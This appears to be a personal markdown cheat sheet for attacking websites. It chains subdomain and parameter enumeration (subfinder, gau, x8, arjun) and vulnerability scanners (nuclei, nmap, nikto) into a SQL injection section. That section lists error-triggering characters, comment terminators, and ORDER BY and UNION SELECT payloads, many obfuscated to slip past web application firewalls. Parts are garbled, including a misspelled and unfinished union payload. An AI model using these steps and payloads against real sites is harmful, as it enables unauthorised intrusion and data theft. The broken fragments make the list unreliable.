## Summary

- [recon step 1 ](#recon)
- 
- [automatic scan](#automatic).
 --[sql scan  ](#SqlScan )




  ### recon
>tool subfinder automatic 
```
subfinder -d example.com >res.txt
```
> using gobuster for wordlists
```
gobuster dns -d example.com -w wordlits.txt
```
>next
> passive scan httpx

```
httpx -l res.txt -o res2.txt
```

> next step install tool 
* [subzy](https://github.com/PentestPad/subzy)
> next

```
subzy run --targets res2.txt > res3.txt

```

>scan parampeter
> old parameter ,1-gau 2-paramspider
* [gau](https://github.com/lc/gau)
```
cat res3.txt |gau |tee res4.txt
```
>next 
```
paramspider -l domains.txt
paramspider -d exam.com
```
> new parampeter
```
ffuf -u exam.com/FUZZ.php -w wordlist.txt

dirsearch -u exam.com 
```
> Bruteforce parameters
* [Sh1Yo/x8](https://github.com/Sh1Yo/x8) 

* Use wordlists of common parameters and send them, look for unexpected behavior from the backend. 
    ```ps1
    x8 -u "https://example.com/" -w <wordlist>
    

    x8 -u "https://example.com/" -X POST -w <wordlist>
    ```

> arjun
```  
arjun -d example.com
```
### the end 





### automatic
>tool all scan
```
nuclei -u example.com
```
>next
```
nmap -A -O example.com
```
> next
```
whatweb example.com
``` 
>next
```
searchsploit example
```
>next
```nikto -h example.com
```
> tool df list

# the end 


### SqlScan

>google dorking
```
site:exam.com id=
site:exam.com php?q=

```
> gf --list
```
cat url.txt|gf sqli | tee sql.txt
```
> web scan
```
https://pentest-tools.com/website-vulnerability-scanning/sql-injection-scanner-online
```
> error reuslt
```
'
"
`
')
")
`)
'))
"))
`))
```
>balance url
```
--+-
--+
)--+-
))--+-
--
--+
)--
))--
-- -/*
/*
%23
%2323
%00
%60
;%00
```
>next order by
```
ORDER BY 9
GROUP BY 9
order by 9
ORDER BY 1,2,3,4,5,6,7,8,9
/*!50000ORDER*/ 9
+ORDER BY/**_**/9
+/*!order/**/by*/1
+AND+MOD(52,12)+/*!50000GROUP*/+BY+100
+/*!50000GROUP*/+/*!50000BY*/+100
23%0AORDER%23%0ABY%23%0A100
+AND+MOD(29,9)+/*!50000ORDER/**_**/*/+/*!50000BY/**_**/*/+100
/*!50000BY/**_**/*/
+/*!12345ORDER*/+/*!12345BY*/100
+ORDER+BY+100+ASC
%2f**%2fORDER%2f**%2fBY%2f**%2f100
```
>next union
```
union selcet 
AND+0+/*!50000%55NI\ON*/+/*!
50000%53ELE\CT/**_**/*/

%23%0A/*!50000union/**_**/*/
%23%0AdistinctROW/**_**/
%23%0ASelect%23%0A
```




